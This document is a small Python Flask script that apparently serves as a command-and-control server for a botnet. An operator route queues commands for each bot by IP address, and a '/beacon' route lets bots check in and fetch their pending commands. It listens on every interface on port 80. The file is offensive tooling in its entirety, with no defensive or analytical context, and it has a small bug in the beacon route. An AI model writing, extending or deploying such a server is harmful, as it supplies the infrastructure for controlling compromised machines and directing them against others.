#!/usr/bin/python3
from flask import Flask, render_template, request
from collections import defaultdict
import os, json

from collections import defaultdict

bots = defaultdict(list)
botLst = []
app = Flask(__name__)

	
@app.route('/')
def cmd():
	botIP = request.args.get('botIP')
	command = request.args.get('command')
	bots[botIP].append(command)
	for bot in bots:
		if bot not in botLst and bot != None:
			botLst.append(bot)		
	return render_template('form.html', command=command, botIP=botIP, bots=botLst)
	
	
@app.route('/beacon')
def beacon():
	ip = request.args.get('ip')
	if ip not in bots:
		bots[ip] = []
	else:
		return json.dumps(bots[ip])
		
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
